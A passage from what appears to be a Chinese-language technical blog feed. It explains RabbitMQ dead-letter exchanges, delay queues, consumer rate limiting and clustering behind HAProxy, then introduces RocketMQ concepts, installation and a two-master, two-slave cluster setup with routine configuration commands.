<li>原队列存在消息过期设置，消息到达超时时间未被消费。</li>
</ol>
<p>死信交换机普通的交换机没有区别，配置如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定死信交换机注入时的Bean名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DLX_EXCHANGE_BEAN_NAME</span> <span class="operator">=</span> <span class="string">&quot;DLX_EXCHANGE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 死信交换机名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">String</span> <span class="variable">dlxExchange</span> <span class="operator">=</span> <span class="string">&quot;dlx_exchange&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明死信交换机</span></span><br><span class="line"><span class="meta">@Bean(DLX_EXCHANGE_BEAN_NAME)</span></span><br><span class="line"><span class="keyword">public</span> Exchange <span class="title function_">DLX_EXCHANGE</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ExchangeBuilder.topicExchange(dlxExchange).durable(<span class="literal">true</span>).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将队列绑定到死信交换机的方式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明队列</span></span><br><span class="line"><span class="meta">@Bean(QUEUE_BEAN_NAME)</span></span><br><span class="line"><span class="keyword">public</span> Queue <span class="title function_">TEST_QUEUE</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个map</span></span><br><span class="line">    HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 通过x-dead-letter-exchange属性指定死信交换机的名称</span></span><br><span class="line">    map.put(<span class="string">&quot;x-dead-letter-exchange&quot;</span>, dlxExchange);</span><br><span class="line">    <span class="comment">// 通过x-dead-letter-routing-key参数指定与死信交换机绑定的routingKey</span></span><br><span class="line">    map.put(<span class="string">&quot;x-dead-letter-routing-key&quot;</span>, dlxRoutingKey);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(queueName, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到队列绑定死信交换机并不是通过<code>Binding</code>的方式，而是通过属性的方式。绑定完毕后，如果该队列中的消息过期，或者超出了队列长度限制，就会被发送到该死信交换机中。</p>
<h2 id="延时队列"><a href="#延时队列" class="headerlink" title="延时队列"></a>延时队列</h2><p>在RabbitMQ中并没有提供延时队列的功能，但是通过<strong>TTL + 死信交换机</strong>可以实现延时队列，如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://ftp.bmp.ovh/imgs/2021/06/3c5df407f4d46e1b.jpg"
                     
                ></p>
<ol>
<li>生产者发送TTL消息到MQ的某个队列Queue1中，该队列指定了一个死信交换机，并且没有消费者接收该队列中的消息。</li>
<li>TTL消息过期后，会转移到死信交换机，消费者通过另一个绑定到死信交换机的队列Queue2接收消息，这样就可以实现延时队列的功能。</li>
</ol>
<p>上面的流程中，对于Queue1来说，DLX是死信交换机；对于Queue2来说，DLX就是普通交换机。代码省略，有一点需要特别注意：</p>
<ul>
<li>Queue2绑定死信交换机时的routingKey，需要包含Queue1绑定死信交换机时通过<code>x-dead-letter-routing-key</code>属性指定的routingKey，这样Queue2才能接收到死信交换机中来自Queue1的消息。</li>
</ul>
<h2 id="消费端限流-1"><a href="#消费端限流-1" class="headerlink" title="消费端限流"></a>消费端限流</h2><p>之前我们介绍了MQ有流量削峰的作用，那么如何做呢？其实非常简单，只需要一些简单的配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="attr">acknowledge-mode:</span> <span class="string">manual</span>   <span class="comment"># 消费者手动ACK</span></span><br><span class="line">        <span class="attr">prefetch:</span> <span class="number">1</span>   <span class="comment"># 指定一个请求能处理多少个消息，如果有事务的话，必须大于等于事务数量</span></span><br></pre></td></tr></table></figure>

<ol>
<li>必须是手动ACK模式，因为只有手动ACK后才能发送下一条消息。</li>
<li>配置<code>prefetch=1</code>其实就相当于调用<code>channel.basicQos(1)</code>，每次确认后才接收下一跳信息。</li>
</ol>
<h1 id="RabbitMQ集群"><a href="#RabbitMQ集群" class="headerlink" title="RabbitMQ集群"></a>RabbitMQ集群</h1><h2 id="RabbitMQ集群搭建"><a href="#RabbitMQ集群搭建" class="headerlink" title="RabbitMQ集群搭建"></a>RabbitMQ集群搭建</h2><p>一般来说，如果只是为了学习RabbitMQ或者验证业务工程的正确性那么在本地环境或者测试环境上使用其单实例部署就可以了，但是出于MQ中间件本身的可靠性、并发性、吞吐量和消息堆积能力等问题的考虑，在生产环境上一般都会考虑使用RabbitMQ的集群方案。</p>
<p><strong>1.1 集群方案的原理</strong></p>
<p>RabbitMQ这款消息队列中间件产品本身是基于Erlang编写，Erlang语言天生具备分布式特性（通过同步Erlang集群各节点的cookie来实现）。RabbitMQ本身不需要像ActiveMQ、Kafka那样通过ZooKeeper分别来实现HA方案和保存集群的元数据。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://ftp.bmp.ovh/imgs/2021/06/b50e4fb8bd8e13c6.jpg"
                     
                ></p>
<p>主要参考官方文档：<a class="link"   href="https://www.rabbitmq.com/clustering.html" >https://www.rabbitmq.com/clustering.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="配置RabbitMQ"><a href="#配置RabbitMQ" class="headerlink" title="配置RabbitMQ"></a>配置RabbitMQ</h2><p>在两台不同的服务器上搭建两个RabbitMQ节点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.准备两台服务器，修改主机名称分别为为m1和m2</span></span><br><span class="line">hostnamectl <span class="built_in">set</span>‐hostname m1 </span><br><span class="line">hostnamectl <span class="built_in">set</span>‐hostname m2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.保持两个主机的.erlang.cookie文件一致，可以从其中的一台服务器拷贝至另一台 </span></span><br><span class="line"><span class="comment"># 文件位置在/var/lib/rabbitmq/.erlang.cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.停止m2机器中rabbitmq的服务</span></span><br><span class="line">rabbitmqctl stop_app </span><br><span class="line"><span class="comment"># 在m2执行如下命令添加节点  </span></span><br><span class="line"><span class="comment"># 首先需要在/etc/hosts中配置m1的ip地址，如果不配就要写ip地址</span></span><br><span class="line">rabbitmqctl join_cluster --ram rabbit@m1</span><br><span class="line"><span class="comment"># 重启rabbitmq的服务</span></span><br><span class="line">rabbitmqctl start_app </span><br><span class="line">systemctl restart rabbitmq‐server.service </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 4.查看集群信息 </span></span><br><span class="line">rabbitmqctl cluster_status</span><br></pre></td></tr></table></figure>

<h2 id="配置HAProxy"><a href="#配置HAProxy" class="headerlink" title="配置HAProxy"></a>配置HAProxy</h2><p>HAProxy提供高可用性、负载均衡以及基于TCP和HTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案,包括Twitter，Reddit，StackOverflow，GitHub在内的多家知名互联网公司在使用。HAProxy实现了一种事件驱动、单一进程模型，此模型支持非常大的并发连接数。</p>
<p>可以将HAProxy安装在第三台服务器上：</p>
<ul>
<li>安装与启动</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.安装 </span></span><br><span class="line">yum install haproxy </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.配置haproxy.cfg文件具体参照下文 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.启动haproxy </span></span><br><span class="line">systemctl start haproxy </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.查看haproxy进程状态 </span></span><br><span class="line">systemctl status haproxy.service</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>haproxy.cfg</code>配置文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span></span><br><span class="line"><span class="comment"># Example configuration for a possible web application. See the</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># full configuration options online. </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># http://haproxy.1wt.eu/download/1.4/doc/configuration.txt </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span></span><br><span class="line"><span class="comment">#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span></span><br><span class="line"><span class="comment"># Global settings </span></span><br><span class="line"><span class="comment">#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span></span><br><span class="line">global </span><br><span class="line"><span class="comment"># to have these messages end up in /var/log/haproxy.log you will </span></span><br><span class="line"><span class="comment"># need to: </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 1) configure syslog to accept network log events. This is done </span></span><br><span class="line"><span class="comment"># by adding the &#x27;‐r&#x27; option to the SYSLOGD_OPTIONS in </span></span><br><span class="line"><span class="comment"># /etc/sysconfig/syslog </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 2) configure local2 events to go to the /var/log/haproxy.log </span></span><br><span class="line"><span class="comment"># file. A line like the following can be added to </span></span><br><span class="line"><span class="comment"># /etc/sysconfig/syslog </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># local2.* /var/log/haproxy.log </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">log</span> 127.0.0.1 local2 </span><br><span class="line"><span class="built_in">chroot</span> /var/lib/haproxy </span><br><span class="line">pidfile /var/run/haproxy.pid </span><br><span class="line">maxconn 4000 </span><br><span class="line">user haproxy </span><br><span class="line">group haproxy </span><br><span class="line">daemon </span><br><span class="line"><span class="comment"># turn on stats unix socket 36 stats socket /var/lib/haproxy/stats </span></span><br><span class="line"><span class="comment">#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span></span><br><span class="line"><span class="comment"># common defaults that all the &#x27;listen&#x27; and &#x27;backend&#x27; sections will</span></span><br><span class="line"><span class="comment"># use if not designated in their block</span></span><br><span class="line"><span class="comment">#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span></span><br><span class="line">defaults </span><br><span class="line">mode http </span><br><span class="line"><span class="built_in">log</span> global </span><br><span class="line">option httplog</span><br><span class="line"></span><br><span class="line">option dontlognull </span><br><span class="line">option http‐server‐close </span><br><span class="line">option forwardfor except 127.0.0.0/8</span><br><span class="line">option redispatch</span><br><span class="line">retries 3 </span><br><span class="line"><span class="built_in">timeout</span> http‐request 10s </span><br><span class="line"><span class="built_in">timeout</span> queue 1m </span><br><span class="line"><span class="built_in">timeout</span> connect 10s </span><br><span class="line"><span class="built_in">timeout</span> client 1m </span><br><span class="line"><span class="built_in">timeout</span> server 1m </span><br><span class="line"><span class="built_in">timeout</span> http‐keep‐alive 10s </span><br><span class="line"><span class="built_in">timeout</span> check 10s </span><br><span class="line">maxconn 3000 </span><br><span class="line"><span class="comment"># 对MQ集群进行监听 </span></span><br><span class="line">listen rabbitmq_cluster </span><br><span class="line"><span class="comment"># 通过5672端口对M1, M2进行映射</span></span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0:5672 </span><br><span class="line"><span class="comment"># 记录TCP连接的状态和时间</span></span><br><span class="line">option tcplog </span><br><span class="line"><span class="comment"># 采用TCP协议</span></span><br><span class="line">mode tcp </span><br><span class="line"><span class="comment"># 开启TCP的Keep Alive(长连接模式)</span></span><br><span class="line">option clitcpka </span><br><span class="line"><span class="comment"># haproxy与mq建立连接的超时时间</span></span><br><span class="line"><span class="built_in">timeout</span> connect 1s </span><br><span class="line"><span class="comment"># 客户端与haproxy最大空闲时间</span></span><br><span class="line"><span class="built_in">timeout</span> client 10s </span><br><span class="line"><span class="comment"># 服务器与haproxy最大空闲时间</span></span><br><span class="line"><span class="built_in">timeout</span> server 10s </span><br><span class="line"><span class="comment"># 采用轮询转发消息</span></span><br><span class="line">balance roundrobin</span><br><span class="line"><span class="comment"># 每5秒发送一次心跳,如连续两次有响应则代表状态良好</span></span><br><span class="line"><span class="comment"># 如连续三次没有响应则视为服务故障,该节点将被剔除</span></span><br><span class="line">server node1 192.168.74.77:5672 check inter 5s rise 2 fall 3 </span><br><span class="line">server node2 192.168.74.88:5672 check inter 5s rise 2 fall 3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启haproxy监控服务 </span></span><br><span class="line">listen http_front </span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0:1080</span><br><span class="line"><span class="comment"># 统计页面自动刷新时间30s</span></span><br><span class="line">stats refresh 30s </span><br><span class="line"><span class="comment"># 统计页面url</span></span><br><span class="line">stats uri /haproxy_stats</span><br><span class="line"><span class="comment"># 指定HAproxy访问用户名和密码设置</span></span><br><span class="line">stats auth username:password</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>RocketMQ</title>
    <url>/2021/06/13/2021/RocketMQ-0/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="RocketMQ介绍"><a href="#RocketMQ介绍" class="headerlink" title="RocketMQ介绍"></a>RocketMQ介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RocketMQ是阿里巴巴2016年MQ中间件，使用Java语言开发，在阿里内部，RocketMQ承接了例如“双11”等高并发场景的消息流转，能够处理万亿级别的消息。</p>
<p>在<a class="link"   href="https://jimmyz.top/2020/06/03/RabbitMQ%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" >RabbitMQ消息队列<i class="fas fa-external-link-alt"></i></a>一文中，我们以及介了MQ是什么，有什么作用和市场上流行的几款MQ产品。RocketMQ以其高吞吐量和优秀的分布式架构而具有独特的优势。</p>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>RocketMQ主要由 Producer、Broker、Consumer 三部分组成，其中Producer 负责生产消息，Consumer 负责消费消息，Broker 负责存储消息。Broker 在实际部署过程中对应一台服务器，每个 Broker 可以存储多个Topic的消息，每个Topic的消息也可以分片存储于不同的 Broker。Message Queue 用于存储消息的物理地址，每个Topic中的消息地址存储于多个 Message Queue 中。ConsumerGroup 由多个Consumer 实例构成。</p>
<h3 id="Topic-主题"><a href="#Topic-主题" class="headerlink" title="Topic 主题"></a>Topic 主题</h3><p>表示一类消息的集合，每个主题包含若干条消息，每条消息只能属于一个主题，是RocketMQ进行消息订阅的基本单位。</p>
<h3 id="标签（Tag）"><a href="#标签（Tag）" class="headerlink" title="标签（Tag）"></a>标签（Tag）</h3><p>为消息设置的标志，用于同一主题下区分不同类型的消息。来自同一业务单元的消息，可以根据不同业务目的在同一主题下设置不同标签。</p>
<p>标签能够有效地保持代码的清晰度和连贯性，并优化RocketMQ提供的查询系统。消费者可以根据Tag实现对不同子主题的不同消费逻辑，实现更好的扩展性。</p>
<h3 id="代理服务器（Broker-Server）"><a href="#代理服务器（Broker-Server）" class="headerlink" title="代理服务器（Broker Server）"></a>代理服务器（Broker Server）</h3><p>消息中转角色，负责存储消息、转发消息。代理服务器在RocketMQ系统中负责接收从生产者发送来的消息并存储、同时为消费者的拉取请求作准备。代理服务器也存储消息相关的元数据，包括消费者组、消费进度偏移和主题和队列消息等。</p>
<h3 id="名字服务（Name-Server）"><a href="#名字服务（Name-Server）" class="headerlink" title="名字服务（Name Server）"></a>名字服务（Name Server）</h3><p>名称服务充当路由消息的提供者。生产者或消费者能够通过名字服务查找各主题相应的Broker IP列表。多个Namesrv实例组成集群，但相互独立，没有信息交换。</p>
<h3 id="生产者组（Producer-Group）"><a href="#生产者组（Producer-Group）" class="headerlink" title="生产者组（Producer Group）"></a>生产者组（Producer Group）</h3><p>同一类Producer的集合，这类Producer发送同一类消息且发送逻辑一致。如果发送的是事物消息且原始生产者在发送之后崩溃，则Broker服务器会联系同一生产者组的其他生产者实例以提交或回溯消费</p>
<h3 id="消费者组（Consumer-Group）"><a href="#消费者组（Consumer-Group）" class="headerlink" title="消费者组（Consumer Group）"></a>消费者组（Consumer Group）</h3><p>同一类Consumer的集合，这类Consumer通常消费同一类消息且消费逻辑一致。消费者组使得在消息消费方面，实现负载均衡和容错的目标变得非常容易。</p>
<p>要注意的是，消费者组的消费者实例必须<strong>订阅完全相同的Topic</strong>。RocketMQ 支持两种消息模式：集群消费（Clustering）和广播消费（Broadcasting）。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>下图是RocketMQ<strong>双主双从</strong>（后面会搭建该集群）架构的示意图：</p>
<p><a href="https://i.loli.net/2020/10/01/ClKAntIVBEWQ9z1.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/01/ClKAntIVBEWQ9z1.jpg"
                      alt="rocket1.jpg"
                ></a></p>
<p>角色介绍：</p>
<ul>
<li>Producer：消息的发送者</li>
<li>Consumer：消息接收者</li>
<li>Broker：暂存和传输消息</li>
<li>NameServer：管理Broker</li>
<li>Topic：区分消息的种类；一个发送者可以发送消息给一个或者多个Topic；一个消息的接收者可以订阅一个或者多个Topic消息</li>
<li>Message Queue：相当于是Topic的分区；用于并行发送和接收消息</li>
</ul>
<h1 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h1><p>本次我们在Linux上安装，由于RocketMQ由Java开发，因此需要提前安装好JDK和Maven。</p>
<h2 id="下载RocketMQ"><a href="#下载RocketMQ" class="headerlink" title="下载RocketMQ"></a>下载RocketMQ</h2><p>RocketMQ最新版本4.7.1下载地址：</p>
<p><a class="link"   href="https://www.apache.org/dyn/closer.cgi?path=rocketmq/4.7.1/rocketmq-all-4.7.1-bin-release.zip" >https://www.apache.org/dyn/closer.cgi?path=rocketmq/4.7.1/rocketmq-all-4.7.1-bin-release.zip<i class="fas fa-external-link-alt"></i></a></p>
<p>本文使用的版本为4.4.0。</p>
<h2 id="安装RocketMQ"><a href="#安装RocketMQ" class="headerlink" title="安装RocketMQ"></a>安装RocketMQ</h2><p>将下载好的RocketMQ解压并放如一个适合文件夹中，本文放在&#x2F;usr&#x2F;local&#x2F;rocketmq4.4.0&#x2F;rocketmq-all-4.4.0-bin-release目录下。进入后有如下三个重要目录：</p>
<ul>
<li>bin：启动脚本，包括shell脚本和CMD脚本</li>
<li>conf：实例配置文件 ，包括broker配置文件、logback配置文件等</li>
<li>lib：依赖jar包，包括Netty、commons-lang、FastJSON等</li>
</ul>
<h2 id="启动RocketMQ"><a href="#启动RocketMQ" class="headerlink" title="启动RocketMQ"></a>启动RocketMQ</h2><ul>
<li>启动NameServer</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动NameServer后台运行</span></span><br><span class="line">nohup sh bin/mqnamesrv &amp;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看启动日志</span></span><br><span class="line">tail -f ~/logs/rocketmqlogs/namesrv.log</span><br></pre></td></tr></table></figure>

<ul>
<li>启动Broker</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动Broker指定nameSrver地址，后台运行</span></span><br><span class="line">nohup sh bin/mqbroker -n localhost:9876 &amp;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看启动日志</span></span><br><span class="line">tail -f ~/logs/rocketmqlogs/broker.log</span><br></pre></td></tr></table></figure>

<p>RocketMQ默认的虚拟机内存较大，启动Broker如果因为内存不足失败，需要编辑如下两个配置文件，修改JVM内存大小:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑runbroker.sh和runserver.sh修改默认JVM大小</span></span><br><span class="line">vi runbroker.sh</span><br><span class="line">vi runserver.sh</span><br></pre></td></tr></table></figure>

<p>参考设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 测试</span><br><span class="line"></span><br><span class="line">* 发送消息</span><br><span class="line"></span><br><span class="line">```sh</span><br><span class="line"># 设置环境变量</span><br><span class="line">export NAMESRV_ADDR=localhost:9876</span><br><span class="line"># 使用安装包的Demo发送消息</span><br><span class="line">bin/tools.sh org.apache.rocketmq.example.quickstart.Producer</span><br></pre></td></tr></table></figure>

<ul>
<li>接收消息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置环境变量</span></span><br><span class="line">export NAMESRV_ADDR=localhost:9876</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.接收消息</span></span><br><span class="line">bin/tools.sh org.apache.rocketmq.example.quickstart.Consumer</span><br></pre></td></tr></table></figure>

<h2 id="关闭RocketMQ"><a href="#关闭RocketMQ" class="headerlink" title="关闭RocketMQ"></a>关闭RocketMQ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭NameServer</span></span><br><span class="line">bin/mqshutdown namesrv</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭Broker</span></span><br><span class="line">bin/mqshutdown broker</span><br></pre></td></tr></table></figure>

<h1 id="RocketMQ集群搭建"><a href="#RocketMQ集群搭建" class="headerlink" title="RocketMQ集群搭建"></a>RocketMQ集群搭建</h1><h2 id="集群特点"><a href="#集群特点" class="headerlink" title="集群特点"></a>集群特点</h2><ul>
<li><p>NameServer是一个几乎无状态节点，可集群部署，节点之间无任何信息同步。</p>
</li>
<li><p>Broker部署相对复杂，Broker分为Master(主)与Slave(从)，一个Master可以对应多个Slave，但是一个Slave只能对应一个Master，Master与Slave的对应关系通过指定相同的BrokerName，不同的BrokerId来定义，BrokerId为0表示Master，非0表示Slave。Master也可以部署多个。每个Broker与NameServer集群中的所有节点建立长连接，定时注册Topic信息到所有NameServer。</p>
</li>
<li><p>Producer与NameServer集群中的其中一个节点（随机选择）建立长连接，定期从NameServer取Topic路由信息，并向提供Topic服务的Master建立长连接，且定时向Master发送心跳。Producer完全无状态，可集群部署。</p>
</li>
<li><p>Consumer与NameServer集群中的其中一个节点（随机选择）建立长连接，定期从NameServer取Topic路由信息，并向提供Topic服务的Master、Slave建立长连接，且定时向Master、Slave发送心跳。Consumer既可以从Master订阅消息，也可以从Slave订阅消息，订阅规则由Broker配置决定。</p>
</li>
</ul>
<h2 id="集群模式"><a href="#集群模式" class="headerlink" title="集群模式"></a>集群模式</h2><p>在RocketMQ解压目录的conf文件夹中，可以看到三个文件夹，它们分别对应不同的集群模式：</p>
<ul>
<li>2m-2s-async : 双主双从异步模式</li>
<li>2m-2s-sync : 双主双从同步模式</li>
<li>2m-noslave : 多Master模式</li>
</ul>
<h3 id="单Master模式"><a href="#单Master模式" class="headerlink" title="单Master模式"></a>单Master模式</h3><p>这种方式风险较大，一旦Broker重启或者宕机时，会导致整个服务不可用。不建议线上环境使用,可以用于本地测试。</p>
<h3 id="多Master模式"><a href="#多Master模式" class="headerlink" title="多Master模式"></a>多Master模式</h3><p>一个集群无Slave，全是Master，例如2个Master或者3个Master，这种模式的优缺点如下：</p>
<ul>
<li>优点：配置简单，单个Master宕机或重启维护对应用无影响，在磁盘配置为RAID10时，即使机器宕机不可恢复情况下，由于RAID10磁盘非常可靠，消息也不会丢（异步刷盘丢失少量消息，同步刷盘一条不丢），性能最高。</li>
<li>缺点：单台机器宕机期间，这台机器上未被消费的消息在机器恢复之前不可订阅，消息实时性会受到影响。</li>
</ul>
<h3 id="多Master多Slave模式（异步）"><a href="#多Master多Slave模式（异步）" class="headerlink" title="多Master多Slave模式（异步）"></a>多Master多Slave模式（异步）</h3><p>每个Master配置一个Slave，有多对Master-Slave，HA(消息从Master拷贝至Slave)采用异步复制方式，主备有短暂消息延迟（毫秒级），这种模式的优缺点如下：</p>
<ul>
<li>优点：即使磁盘损坏，消息丢失的非常少，且消息实时性不会受影响，同时Master宕机后，消费者仍然可以从Slave消费，而且此过程对应用透明，不需要人工干预，性能同多Master模式几乎一样。</li>
<li>缺点：Master宕机，磁盘损坏情况下会丢失少量消息。</li>
</ul>
<h3 id="多Master多Slave模式（同步）"><a href="#多Master多Slave模式（同步）" class="headerlink" title="多Master多Slave模式（同步）"></a>多Master多Slave模式（同步）</h3><p>每个Master配置一个Slave，有多对Master-Slave，HA采用同步双写方式，即只有主备都写成功，才向应用返回成功，这种模式的优缺点如下：</p>
<ul>
<li>优点：数据与服务都无单点故障，Master宕机情况下，消息无延迟，服务可用性与数据可用性都非常高。</li>
<li>缺点：性能比异步复制模式略低（大约低10%左右），发送单个消息的耗时会略高，且目前版本在主节点宕机后，备机不能自动切换为主机。</li>
</ul>
<h2 id="双主双从集群搭建"><a href="#双主双从集群搭建" class="headerlink" title="双主双从集群搭建"></a>双主双从集群搭建</h2><p>本文我们搭建双主双从同步模式的集群，即2m-2s-sync。</p>
<h3 id="总体架构"><a href="#总体架构" class="headerlink" title="总体架构"></a>总体架构</h3><p>2m-2s-sync的架构图如下所示：</p>
<p><a href="https://i.loli.net/2020/10/01/MViZbHuayKf5E6v.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/01/MViZbHuayKf5E6v.png"
                      alt="rocket2.png"
                ></a></p>
<h3 id="集群工作流程"><a href="#集群工作流程" class="headerlink" title="集群工作流程"></a>集群工作流程</h3><ol>
<li><strong>启动NameServer，NameServer起来后监听端口</strong>，等待Broker、Producer、Consumer连上来，相当于一个路由控制中心。</li>
<li>Broker启动，跟所有的NameServer保持长连接，定时发送心跳包。心跳包中包含当前Broker信息(IP+端口等)以及存储所有Topic信息。<strong>注册成功后，NameServer集群中就有Topic跟Broker的映射关系。</strong></li>
<li>收发消息前，先创建Topic，<strong>创建Topic时需要指定该Topic要存储在哪些Broker上</strong>，也可以在发送消息时自动创建Topic。</li>
<li>Producer发送消息，启动时先跟NameServer集群中的其中一台建立长连接，并从NameServer<strong>中获取当前发送的Topic存在哪些Broker上</strong>，轮询从队列列表中选择一个队列，<strong>然后与队列所在的Broker建立长连接从而向Broker发消息。</strong></li>
<li>Consumer跟Producer类似，跟其中一台NameServer建立长连接，获取当前订阅Topic存在哪些Broker上，然后直接跟Broker建立连接通道，开始消费消息。</li>
</ol>
<h3 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h3><p>本次我们使用两台服务器搭建2m-2s-sync集群，每台服务器上的集群角色如下：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
<th>角色</th>
<th>架构模式</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>192.168.74.77</td>
<td>nameserver、brokerserver</td>
<td>Master1、Slave2</td>
</tr>
<tr>
<td>2</td>
<td>192.168.74.88</td>
<td>nameserver、brokerserver</td>
<td>Master2、Slave1</td>
</tr>
</tbody></table>
<h3 id="添加信息"><a href="#添加信息" class="headerlink" title="添加信息"></a>添加信息</h3><p>修改hosts文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p>添加如下配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nameserver</span></span><br><span class="line">192.168.74.77 rocketmq-nameserver1</span><br><span class="line">192.168.74.88 rocketmq-nameserver2</span><br><span class="line"><span class="comment"># broker</span></span><br><span class="line">192.168.74.77 rocketmq-master1</span><br><span class="line">192.168.74.77 rocketmq-slave2</span><br><span class="line">192.168.74.88 rocketmq-master2</span><br><span class="line">192.168.74.88 rocketmq-slave1</span><br></pre></td></tr></table></figure>

<p>配置完成后, 重启网卡：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>

